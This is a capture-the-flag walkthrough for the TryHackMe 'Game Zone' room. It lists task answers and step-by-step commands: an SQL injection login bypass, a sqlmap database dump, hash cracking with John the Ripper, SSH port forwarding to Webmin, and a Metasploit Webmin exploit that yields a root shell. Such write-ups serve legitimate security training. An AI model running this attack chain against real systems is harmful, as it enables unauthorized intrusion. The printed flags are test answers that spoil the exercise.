@@ -1,0 +1,147 @@
+#### Link to room: https://tryhackme.com/room/gamezone
+
+#### [Task 1] Deploy the vulnerable machine
+   1. No answer needed
+   2. Agent 47 
+> Take a screenshot of the person 
+>
+> Go to google and click "images" 
+>
+> In the search bar there should be a camera icon that is called "search by image" aka google reverse image search 
+>
+> Upload the screenshot you took and you should be able to find the name of the character 
+
+#### [Task 2] Obtain access via SQLi
+   1. No answer needed
+   2. No answer needed
+   3. portal.php
+> Hint:
+>
+> Enter the code "' or 1=1 -- -" as the username and click enter
+>
+> You should then be redirected to the /portal.php page
+
+#### [Task 3] Using SQLMap 
+   1. ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+> Hint: 
+>
+> Open up Burp and under the proxy tab, starting intercepting on
+>
+> Make sure the proxy is on too in the browser 
+>
+> On the web page, make a search for the word "test"
+>
+> Back on burp, something similar to this should appear in the burp window
+```
+POST /portal.php HTTP/1.1
+Host: \<GIVEN-IP-ADDRESS\>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://\<GIVEN-IP-ADDRESS\>/portal.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Connection: close
+Cookie: PHPSESSID=hdb5dmu4vpm3asuf20nm12gfv2
+Upgrade-Insecure-Requests: 1
+
+searchitem=test
+```
+> Type the following command into terminal: 
+>
+> sqlmap -r request.txt -dbms=mysql --dump 
+>
+> You will be asked the following questions and answer them accordingly 
+```
+Do you want to keep testing the others(if any)? [y/N]: y
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+```
+> After it has finished you should be able to see 2 tables:
+>
+> A table with names and descriptions
+>
+> And a table with a hash and the username
+   2. agent47
+   3. post
+
+#### [Task 4] Cracking a password with JohnTheRipper
+   1. No answer needed
+> Hint: 
+>
+> Save the hash into a file called hash.txt
+>
+> Also visit this [webpage](https://www.tunnelsup.com/hash-analyzer/) to see what hash format the hash is in 
+   2. videogamer124
+> Hint: 
+>
+> Run the following command in terminal to de-hash the password: 
+>
+> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
+   3. 649ac17b1480ac13ef1e4fa579dac95c
+> Hint: 
+>
+> Login via SSH by typing the following command into terminal 
+>
+> ssh agent47@\<GIVEN-IP-ADDRESS\>
+>
+> Enter the password "videogamer124"
+>
+> Then you should be logged in as agent47 where you can then cat the user flag 
+
+#### [Task 5] Exposing services with reverse SSH tunnels 
+   1. 5 
+> Hint: 
+>
+> Run the "ss -tulpn" in agent47's account 
+>
+> Count the number of TCP ports present 
+   2. webmin
+> Hint: 
+>
+> In your local terminal, type the following command: 
+>
+> ssh -L 10000:localhost:10000 agent47@\<GIVEN-IP-ADDRESS\>
+>
+> Navigate to "http://localhost:10000" in the browser
+>
+> Login with the credentials agent47:videogamer124
+>
+> You should be presented with webmin page (the exposed CMS)
+   3. 1.580
+> Hint: 
+>
+> On the webmin page you should be able to see the version number
+
+#### [Task 6] Privilege escalation with Metasploit
+   1. a4b945830144bdd71908d12d902adeee
+> Hint: 
+>
+> Open metasploit with the command "msfconsole" in the terminal 
+>
+> Type the command "search webmin 1.580" in the msfconsole
+>
+> There should be an exploit titled "exploit/unix/webapp/webmin_show_cgi_exec"
+>
+> Type "use exploit/unix/webapp/webmin_show_cgi_exec"
+>
+> If you type "show options", you will be presented with a table that contains a column that states "required"
+>
+> We need to fill in these setting with the following inputs 
+```
+set PASSWORD videogamer124
+set RHOSTs localhost
+set USERNAME agent47
+
+```
+> Type show options to make sure your inputs have successfully been added
+>
+> Then type "run" to run the exploit
+>
+> Once we have a shell then type the command to see the answer: 
+>
+> cat /root/root.txt 
+>
+> NOTE: You may have to use the following "set SSL false"
+
